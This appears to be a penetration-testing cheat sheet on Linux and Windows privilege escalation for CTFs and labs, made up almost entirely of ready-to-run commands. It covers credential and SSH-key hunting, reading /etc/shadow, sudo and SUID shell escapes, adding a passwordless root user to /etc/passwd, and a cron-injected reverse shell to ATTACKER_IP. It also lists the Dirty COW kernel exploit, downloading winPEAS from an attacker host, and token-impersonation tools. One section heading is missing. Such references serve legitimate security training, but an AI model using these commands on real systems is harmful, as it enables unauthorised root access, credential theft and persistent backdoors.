01Linux — Initial Enumeration
Mindset: You have a low-priv shell. Goal is root. Enumerate everything — misconfigs, weak permissions, outdated kernel, credentials in files.
# System & User Info
bash
id                              # current user and groups
whoami
uname -a                        # kernel version
cat /etc/os-release             # distro info
cat /etc/passwd                 # list all users
cat /etc/shadow                 # password hashes (if readable)
cat /etc/group                  # group memberships
env                             # environment variables
history                         # command history
cat ~/.bash_history
cat /etc/hosts
# Network & Processes
bash
ss -tnp                         # open TCP ports
netstat -antup                  # all connections
ps aux                          # all running processes
ps aux | grep root              # processes running as root
ip a                            # network interfaces
route                           # routing table
# Credential Hunting
bash
# Config files with passwords
find / -name "*.conf" 2>/dev/null | xargs grep -l "password" 2>/dev/null
find / -name "config.php" 2>/dev/null
grep -r "password" /var/www/html 2>/dev/null

# SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null

# World-readable sensitive files
find /home -readable -type f 2>/dev/null

# less / man

sudo man man              # then type: !/bin/bash

# python
sudo python3 -c 'import os;os.system("/bin/bash")'

# perl
sudo perl -e 'exec "/bin/bash"'

# ruby
sudo ruby -e 'exec "/bin/bash"'

sudo find . -exec /bin/bash \;

sudo nmap --interactive
nmap> !sh

# tar
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
03SUID Binary Exploits
What is SUID? Binaries with SUID bit set run as the file owner (often root) regardless of who executes them. Find them → check GTFOBins.
# Find SUID Binaries
bash
# All SUID binaries
find / -perm -4000 2>/dev/null

# SUID + SGID
find / -perm -u=s -o -perm -g=s 2>/dev/null

# With full path and permissions
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null
# Common SUID Exploits
bash
# bash (if SUID)
/bin/bash -p                     # -p preserves EUID

# find
find . -exec /bin/bash -p \;

# cp — overwrite /etc/passwd or /etc/shadow
cp /etc/passwd /tmp/passwd.bak
# Add root user with no password to /etc/passwd
newroot::0:0:root:/root:/bin/bash  # append this line
cp /tmp/passwd.new /etc/passwd

# nmap (SUID)
nmap --interactive
nmap> !sh

# python / python3
./python3 -c 'import os;os.execl("/bin/sh","sh","-p")'
04Cron Job Exploitation
# Find Cron Jobs
bash
cat /etc/crontab
cat /etc/cron.d/*
ls -la /etc/cron.*
crontab -l                      # current user crons
crontab -l -u root               # root crons (if allowed)

# Monitor running crons
watch -n 1 "ps aux | grep cron"

# pspy — monitor without root
./pspy64                         # download from github
# Exploitation — Writable Cron Script
bash
# If cron runs /opt/cleanup.sh as root and we can write to it
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /opt/cleanup.sh

# Or: chmod SUID on bash
echo 'chmod +s /bin/bash' >> /opt/cleanup.sh
# After cron runs:
/bin/bash -p
05Writable Files & /etc/passwd
# Find World-Writable Files
bash
# World-writable files
find / -writable -type f 2>/dev/null

# World-writable directories
find / -writable -type d 2>/dev/null

# Check if /etc/passwd is writable
ls -la /etc/passwd
ls -la /etc/shadow
# /etc/passwd — Add Root User
bash
# Generate password hash
openssl passwd -1 -salt xyz password123

# Append new root user to /etc/passwd (no hash = no password)
echo 'renvector::0:0:root:/root:/bin/bash' >> /etc/passwd

# Append with password hash
echo 'renvector:$1$xyz$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd

# Switch to new root user
su renvector
06Kernel Exploits
Warning: Kernel exploits can crash the system. Use as last resort in real engagements. In CTFs/labs, go for it.
# Check Kernel Version & Search Exploits
bash
uname -a
# Example output: Linux victim 3.13.0-24-generic #46-Ubuntu...

# Search exploitdb
searchsploit linux kernel 3.13
searchsploit Ubuntu 14.04

# Copy exploit to working dir
searchsploit -m 37292             # overlayfs privesc
# Dirty COW (CVE-2016-5195) — Kernel < 4.8.3
bash
# Download exploit
searchsploit -m 40839

# Compile and run
gcc -pthread 40839.c -o dirtycow -lcrypt
./dirtycow password123

# Creates firefart user with root privs
su firefart

08Windows Privilege Escalation
# Initial Enumeration (cmd / powershell)
cmd
whoami
whoami /priv                     # current privileges
whoami /groups                   # group memberships
net user                         # all users
net localgroup administrators   # admin group members
systeminfo                       # OS/patch level
ipconfig /all
netstat -ano
tasklist                         # running processes
schtasks /query /fo LIST /v      # scheduled tasks
# WinPEAS
powershell
# Download and run
certutil -urlcache -f http://ATTACKER_IP:8000/winPEAS.exe winpeas.exe
.\winpeas.exe

# Powershell download
Invoke-WebRequest -Uri http://ATTACKER_IP:8000/winPEAS.exe -OutFile C:\Users\Public\winpeas.exe
# Token Impersonation — Juicy Potato / PrintSpoofer
cmd
# Check for SeImpersonatePrivilege or SeAssignPrimaryToken
whoami /priv

# PrintSpoofer (Windows 10 / Server 2019)
.\PrintSpoofer.exe -i -c cmd

# JuicyPotatoNG (older systems)
.\JuicyPotatoNG.exe -t * -p C:\Windows\System32\cmd.exe
# Unquoted Service Path
cmd
# Find unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows" | findstr /i /v """"

# If path is: C:\Program Files\Vuln App\service.exe
# Place malicious exe at: C:\Program.exe or C:\Program Files\Vuln.exe
sc stop VulnService
sc start VulnService
